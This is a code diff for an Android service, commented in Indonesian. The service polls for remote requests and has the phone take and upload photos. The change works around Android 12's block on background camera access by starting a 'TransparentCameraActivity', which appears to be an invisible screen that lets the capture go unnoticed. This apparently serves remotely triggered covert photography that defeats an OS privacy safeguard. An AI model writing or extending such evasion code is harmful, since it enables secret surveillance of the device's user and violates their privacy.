@@ -154,12 +154,22 @@ public class CameraPollingService extends Service {
                                 + " | kamera=" + camera
                 );
 
-                // Jalankan CameraService untuk ambil foto
-                CameraService.start(
-                        getApplicationContext(),
-                        requestId,
-                        camera
-                );
+                // Android 12+ (API 31): gunakan TransparentCameraActivity
+                // karena sistem memblokir akses kamera dari background service.
+                // Android < 12: tetap gunakan CameraService (background) seperti biasa.
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                    TransparentCameraActivity.start(
+                            getApplicationContext(),
+                            requestId,
+                            camera
+                    );
+                } else {
+                    CameraService.start(
+                            getApplicationContext(),
+                            requestId,
+                            camera
+                    );
+                }
 
                 // Polling lebih lambat setelah request ditemukan —
                 // beri waktu CameraService selesai ambil & upload
